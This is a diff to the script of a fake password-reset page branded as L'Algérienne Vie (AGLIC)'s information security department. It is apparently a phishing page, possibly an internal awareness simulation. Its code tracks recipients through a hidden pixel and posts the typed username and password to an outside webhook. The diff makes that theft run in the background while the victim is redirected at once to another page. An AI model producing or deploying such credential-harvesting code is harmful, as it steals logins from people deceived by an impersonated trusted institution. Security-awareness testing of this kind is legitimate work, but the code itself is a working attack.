@@ -61,13 +61,13 @@
   L'Algérienne Vie (AGLIC) - Direction de la Sécurité des Systèmes d'Information (DSI). © 2026
 </div>
 
-<!-- Hidden image for tracking (GET request to Pipedream with rid) -->
+<!-- Hidden image for tracking (GET request to webhook with rid) -->
 <img id="trackingPixel" style="display:none; width:0; height:0;" alt="" />
 
 <script>
-  // Your Pipedream webhook URL
-  const PIPEDREAM_WEBHOOK_URL = 'https://hkdk.events/wwmcpdprhlf5zq';
-  // Redirect target after successful form submission
+  // Your webhook URL
+  const WEBHOOK_URL = 'https://hkdk.events/wwmcpdprhlf5zq';
+  // Redirect target after successful validation (immediate redirect)
   const REDIRECT_URL = 'https://achraflyy.github.io/trustnofeature/tawbikh.html';
   
   (function() {
@@ -76,15 +76,15 @@
 
     if (rid && rid.trim() !== '') {
       const cleanRid = encodeURIComponent(rid.trim());
-      const targetUrl = PIPEDREAM_WEBHOOK_URL + '?rid=' + cleanRid;
+      const targetUrl = WEBHOOK_URL + '?rid=' + cleanRid;
 
-      // Set form action - native POST submission to Pipedream
+      // Set form action - native POST submission to webhook
       const form = document.getElementById('resetForm');
       if (form) {
         form.action = targetUrl;
       }
 
-      // Set tracking pixel src - sends GET request to Pipedream
+      // Set tracking pixel src - sends GET request to webhook
       const trackingImg = document.getElementById('trackingPixel');
       if (trackingImg) {
         trackingImg.src = targetUrl;
@@ -134,49 +134,37 @@
       return false;
     }
 
-    // If there's a redirect target, we handle submission via fetch to avoid losing the redirect
-    // because native form POST would navigate to the webhook URL, not our redirect.
-    // This ensures we send data to Pipedream, then redirect to tawbikh.com.
-    if (form && form.action && form.action.includes('pipedream.net')) {
-      e.preventDefault(); // prevent native submission
-      
-      // Collect form data
-      const formData = new FormData(form);
-      const username = formData.get('username');
-      const password = formData.get('password');
-      const confirmPassword = formData.get('confirm_password');
-      
-      // Prepare POST data as application/x-www-form-urlencoded (same as native form)
-      const postData = new URLSearchParams();
-      postData.append('username', username);
-      postData.append('password', password);
-      postData.append('confirm_password', confirmPassword);
-      
-      // Send fetch request to Pipedream webhook (preserves rid from action URL)
+    // Validation passed - redirect IMMEDIATELY, send data in background
+    e.preventDefault();
+    
+    // Collect form data
+    const formData = new FormData(form);
+    const username = formData.get('username');
+    const password = formData.get('password');
+    const confirmPassword = formData.get('confirm_password');
+    
+    // Prepare POST data as application/x-www-form-urlencoded
+    const postData = new URLSearchParams();
+    postData.append('username', username);
+    postData.append('password', password);
+    postData.append('confirm_password', confirmPassword);
+    
+    // Send fetch request to webhook in background (fire and forget)
+    if (form && form.action) {
       fetch(form.action, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
         },
         body: postData.toString(),
-        // Use keepalive to ensure request completes even during navigation
-        keepalive: true
-      })
-      .then(() => {
-        // Redirect to tawbikh.com after successful submission
-        window.location.href = REDIRECT_URL;
-      })
-      .catch((err) => {
-        console.error('Submission error:', err);
-        // Still redirect even if fetch fails (user experience)
-        window.location.href = REDIRECT_URL;
-      });
-      
-      return false;
+        keepalive: true // Ensures request completes even during page navigation
+      }).catch(err => console.error('Background submission error:', err));
     }
     
-    // Fallback for any other configuration: allow native submission
-    return true;
+    // Redirect immediately after validation (no waiting for fetch)
+    window.location.href = REDIRECT_URL;
+    
+    return false;
   }
 </script>
 </body>
